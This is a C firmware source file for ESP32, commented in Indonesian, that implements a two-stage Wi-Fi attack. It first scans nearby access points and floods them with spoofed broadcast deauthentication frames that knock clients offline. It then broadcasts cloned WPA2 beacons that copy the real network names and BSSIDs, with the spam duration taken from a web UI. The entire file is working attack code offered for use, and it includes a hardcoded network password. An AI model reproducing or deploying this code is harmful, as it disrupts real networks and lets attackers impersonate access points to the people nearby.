/**
 * @file attack_beacon_spam.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * 
 * @brief Modifikasi Kustom: Pembalikan Logika (Deauth Hopping masal dikunci 10 detik, 
 *        lalu beralih otomatis ke WPA2 Beacon Spam dengan durasi dinamis sesuai 
 *        input waktu sesuka hati dari Web UI).
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include <string.h>

// Menghubungkan ke modul komponen internal ap_scanner bawaan
#include "ap_scanner.h"

static const char *TAG = "reversed_sequential_attack";
static esp_timer_handle_t attack_timer_handle = NULL;

#define MAX_SPAM_APS 100

typedef struct {
    uint8_t ssid[33];
    uint8_t ssid_len;
    uint8_t bssid[6];
    uint8_t channel;
} custom_target_ap_t;

static custom_target_ap_t target_pool[MAX_SPAM_APS];
static uint16_t total_targets = 0;
static uint16_t current_deauth_index = 0;

// Variabel Kontrol Status Serangan (State Machine)
typedef enum {
    STATE_DEAUTH_HOPPING,
    STATE_BEACON_SPAM
} attack_state_t;

static attack_state_t current_state = STATE_DEAUTH_HOPPING;

// Penghitung biner ticks untuk durasi
static uint32_t attack_execution_counter = 0;

// KUNCI JEDA DEAUTH SEBENTAR: Diubah menjadi 10 detik. Karena timer berjalan setiap 100ms, maka 10 / 0.1s = 100 Ticks.
#define DEAUTH_FIXED_TICKS 100

// Penampung durasi dinamis Beacon Spam dari Web UI
static uint32_t beacon_max_ticks = 3000; 

// Kata sandi tunggal global kustom sesuai instruksi Anda
static const char *GLOBAL_PASSWORD = "fX9!mK4$zQ2#vW9&tP7@jL2xN5*bV8%c";

/**
 * @brief Fungsi pembentuk raw packet Deauth Frame tingkat rendah
 */
static void send_raw_deauth_frame(const uint8_t *target_bssid, uint8_t channel) {
    uint8_t deauth_packet[26] = {
        0xC0, 0x00,                         // Type/Subtype: Deauthentication
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    };
    
    memcpy(&deauth_packet[10], target_bssid, 6); // Source Address (Menyamar jadi Router)
    memcpy(&deauth_packet[16], target_bssid, 6); // BSSID
    
    deauth_packet[22] = 0x00; // Sequence Number Low
    deauth_packet[23] = 0x00; // Sequence Number High
    deauth_packet[24] = 0x07; // Reason Code
    deauth_packet[25] = 0x00;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, 26, false);
}

/**
 * @brief Membuat dan mengirimkan raw packet beacon frame dengan enkripsi WPA2-PSK
 */
static void build_and_send_wpa2_beacon(const custom_target_ap_t *ap) {
    uint8_t packet[256] = {
        0x80, 0x00,                         // Type/Subtype: Beacon Frame
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    };

    memcpy(&packet[10], ap->bssid, 6); // Transmitter Address
    memcpy(&packet[16], ap->bssid, 6); // BSSID

    packet[22] = 0x00; packet[23] = 0x00;
    int index = 24;
    memset(&packet[index], 0, 8); index += 8; // Timestamp
    packet[index++] = 0x64; packet[index++] = 0x00; // Interval
    packet[index++] = 0x11; packet[index++] = 0x04; // Privacy Capability (WPA2)

    packet[index++] = 0x00; 
    packet[index++] = ap->ssid_len;
    memcpy(&packet[index], ap->ssid, ap->ssid_len); index += ap->ssid_len;

    uint8_t sup_rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C };
    memcpy(&packet[index], sup_rates, sizeof(sup_rates)); index += sizeof(sup_rates);

    packet[index++] = 0x03; packet[index++] = 0x01;
    packet[index++] = ap->channel;

    uint8_t rsn_ie[] = {
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 
        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 
        0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00
    };
    memcpy(&packet[index], rsn_ie, sizeof(rsn_ie)); index += sizeof(rsn_ie);

    esp_wifi_set_channel(ap->channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, index, false);
}

/**
 * @brief Loop Otomatis Pengendali State Machine Serangan (FreeRTOS Timer)
 */
static void attack_timer_callback(void *arg) {
    if (total_targets == 0) return;

    attack_execution_counter++;

    if (current_state == STATE_DEAUTH_HOPPING) {
        // --- TAHAP 1: DEAUTH HOPPING SEBENTAR (DURASI TETAP 10 DETIK) ---
        custom_target_ap_t *target = &target_pool[current_deauth_index];
        send_raw_deauth_frame(target->bssid, target->channel);
        
        current_deauth_index = (current_deauth_index + 1) % total_targets;

        // Cek Apakah Waktu Deauth 10 Detik Sudah Habis?
        if (attack_execution_counter >= DEAUTH_FIXED_TICKS) {
            ESP_LOGW(TAG, "Deauth Pemutus Selesai! Mengubah status ke Tahap 2: WPA2 Beacon Spam Terenkripsi...");
            current_state = STATE_BEACON_SPAM;
            attack_execution_counter = 0; // Reset counter untuk menghitung durasi Beacon Spam
        }
    } 
    else if (current_state == STATE_BEACON_SPAM) {
        // --- TAHAP 2: BEACON SPAM MENYAMAR MENGIKUTI WAKTU MENIT WEB UI ---
        for (int i = 0; i < total_targets; i++) {
            build_and_send_wpa2_beacon(&target_pool[i]); 
        }

        // Cek Apakah Durasi Menit Penyamaran dari Web UI Sudah Habis?
        if (attack_execution_counter >= beacon_max_ticks) {
            ESP_LOGW(TAG, "Durasi Waktu dari Web UI Telah Habis! Menghentikan seluruh serangan secara otomatis.");
            attack_beacon_spam_stop();
        }
    }
}

void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    uint16_t scanned_count = ap_scanner_get_count();
    attack_execution_counter = 0;
    current_deauth_index = 0;
    current_state = STATE_DEAUTH_HOPPING; // Selalu mulai dari Deauth Hopping

    // MENYINKRONKAN WAKTU BEACON SPAM SECARA DINAMIS DARI WEB UI:
    // Angka 'count' dari input kolom Web UI kita jadikan sebagai menit lamanya Beacon Spam memancar.
    // Jika user menginput 0 atau tidak valid, kita beri default 5 menit (3000 Ticks)
    uint32_t input_seconds = (count > 0) ? (count * 60) : 300; 
    beacon_max_ticks = (input_seconds * 10); // Konversi skala Ticks karena timer berputar per 100ms

    wifi_config_t ap_config;
    if (esp_wifi_get_config(WIFI_IF_AP, &ap_config) == ESP_OK) {
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        strncpy((char *)ap_config.ap.password, GLOBAL_PASSWORD, 64);
        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    }

    if (scanned_count == 0) {
        ESP_LOGW(TAG, "Scan kosong. Mengaktifkan backup data simulasi...");
        total_targets = 5;
        for (int i = 0; i < total_targets; i++) {
            snprintf((char *)target_pool[i].ssid, 32, "ZTE-Clone_%d", i);
            target_pool[i].ssid_len = strlen((char *)target_pool[i].ssid);
            target_pool[i].channel = 1 + (i * 5) % 13;
            for (int j = 0; j < 6; j++) target_pool[i].bssid[j] = esp_random() & 0xFF;
        }
    } else {
        total_targets = (scanned_count > MAX_SPAM_APS) ? MAX_SPAM_APS : scanned_count;
        ESP_LOGI(TAG, "Merekam %d AP sekitar. Memulai Tahap 1: Deauth Hopping 10 Detik...", total_targets);

        for (int i = 0; i < total_targets; i++) {
            const wifi_ap_record_t *record = ap_scanner_get_record(i);
            if (record != NULL) {
                memcpy(target_pool[i].ssid, record->ssid, 32);
                target_pool[i].ssid[32] = '\0';
                target_pool[i].ssid_len = strlen((char *)target_pool[i].ssid);
                target_pool[i].channel = record->primary;
                memcpy(target_pool[i].bssid, record->bssid, 6); 
            }
        }
    }

    if (attack_timer_handle == NULL) {
        const esp_timer_create_args_t args = { .callback = &attack_timer_callback, .name = "seq_attack_timer" };
        ESP_ERROR_CHECK(esp_timer_create(&args, &attack_timer_handle));
        ESP_ERROR_CHECK(esp_timer_start_periodic(attack_timer_handle, 100000)); 
    }
}

void attack_beacon_spam_stop(void) {
    if (attack_timer_handle != NULL) {
        esp_timer_stop(attack_timer_handle);
        esp_timer_delete(attack_timer_handle);
        attack_timer_handle = NULL;
    }
    total_targets = 0;
    ESP_LOGI(TAG, "Serangan berurutan dihentikan.");
}
